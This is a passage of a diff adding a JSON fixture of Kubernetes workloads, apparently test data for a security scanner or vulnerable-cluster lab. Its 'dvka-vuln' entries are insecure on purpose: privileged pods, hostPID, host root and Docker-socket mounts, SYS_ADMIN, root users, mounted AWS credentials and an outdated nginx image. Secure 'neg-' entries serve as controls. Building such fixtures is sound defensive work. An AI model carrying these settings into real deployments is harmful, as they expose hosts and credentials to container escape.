+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "sec-env-secret",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "sec-env-secret"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "sec-env-secret"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "sec-env-secret"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "env": [
+         {
+          "name": "DB_PASSWORD",
+          "valueFrom": {
+           "secretKeyRef": {
+            "name": "db-credentials",
+            "key": "password"
+           }
+          }
+         }
+        ]
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "sec-cloud-creds",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "sec-cloud-creds"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "sec-cloud-creds"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "sec-cloud-creds"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "c",
+          "mountPath": "/root/.aws/credentials",
+          "subPath": "credentials"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "c",
+        "secret": {
+         "secretName": "aws-credentials"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "neg-secret-as-file",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-secret-as-file"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "neg-secret-as-file"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "neg-secret-as-file"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "s",
+          "mountPath": "/etc/app/secrets",
+          "readOnly": true
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "s",
+        "secret": {
+         "secretName": "db-credentials"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "as-fanout-a",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "as-fanout-a"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "as-fanout-a"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "as-fanout-a"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "shared-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "as-fanout-b",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "as-fanout-b"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "as-fanout-b"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "as-fanout-b"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "shared-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "as-fanout-c",
+    "namespace": "dvka-baseline",
+    "labels": {
+     "app": "as-fanout-c"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "as-fanout-c"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "as-fanout-c"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "shared-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "neg-pair-a",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-pair-a"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "neg-pair-a"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "neg-pair-a"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "pair-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "neg-pair-b",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-pair-b"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "neg-pair-b"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "neg-pair-b"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "pair-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "gap-cve-image",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "gap-cve-image"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "gap-cve-image"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "gap-cve-image"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "nginx:1.14.0",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "gap-untrusted-registry",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "gap-untrusted-registry"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "gap-untrusted-registry"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "gap-untrusted-registry"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.untrusted.invalid/team/app:2.0",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "ap-frontend",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "ap-frontend"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "ap-frontend"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "ap-frontend"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "privileged": true
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "ap-frontend-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "prio-isolated",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "prio-isolated"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "prio-isolated"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "prio-isolated"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "privileged": true
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "prio-vuln-exposed",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "prio-vuln-exposed"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "prio-vuln-exposed"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "prio-vuln-exposed"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "nginx:1.14.0",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "100m",
+          "memory": "64Mi"
+         },
+         "requests": {
+          "cpu": "10m",
+          "memory": "16Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "neg-api",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-api"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "neg-api"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "neg-api"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "neg-api-sa"
+     }
+    }
+   }
+  }
+ ],
+ "replicasets": [
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-privileged-zxr89df2x8",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-privileged"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-privileged",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-privileged"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-privileged"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "privileged": true
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-host-pid-qlb79lrqhn",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-pid"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-host-pid",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-host-pid"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-host-pid"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "hostPID": true
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-hostpath-etc-rvqxw729w7",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-hostpath-etc"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-hostpath-etc",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-hostpath-etc"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-hostpath-etc"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "h",
+          "mountPath": "/host-etc"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "h",
+        "hostPath": {
+         "path": "/etc"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-hostpath-root-6mdfh57czx",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-hostpath-root"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-hostpath-root",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-hostpath-root"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-hostpath-root"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "h",
+          "mountPath": "/host"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "h",
+        "hostPath": {
+         "path": "/"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-hostpath-writable-qx9ggs2z7c",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-hostpath-writable"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-hostpath-writable",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-hostpath-writable"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-hostpath-writable"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "h",
+          "mountPath": "/data"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "h",
+        "hostPath": {
+         "path": "/var/log/dvka"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-docker-socket-rphnh2l5h6",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-docker-socket"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-docker-socket",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-docker-socket"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-docker-socket"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "d",
+          "mountPath": "/var/run/docker.sock"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "d",
+        "hostPath": {
+         "path": "/var/run/docker.sock"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-cap-sys-admin-5cv4n7ggfz",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-cap-sys-admin"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-cap-sys-admin",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-cap-sys-admin"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-cap-sys-admin"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ],
+          "add": [
+           "SYS_ADMIN"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-caps-not-dropped-tcp7ns4f62",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-caps-not-dropped"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-caps-not-dropped",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-caps-not-dropped"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-caps-not-dropped"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {}
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-allow-privesc-d9r2vb2h6z",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-allow-privesc"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-allow-privesc",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-allow-privesc"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-allow-privesc"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "wl-run-as-root-ztpzmq58fh",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-run-as-root"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "wl-run-as-root",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "wl-run-as-root"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-run-as-root"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "runAsUser": 0,
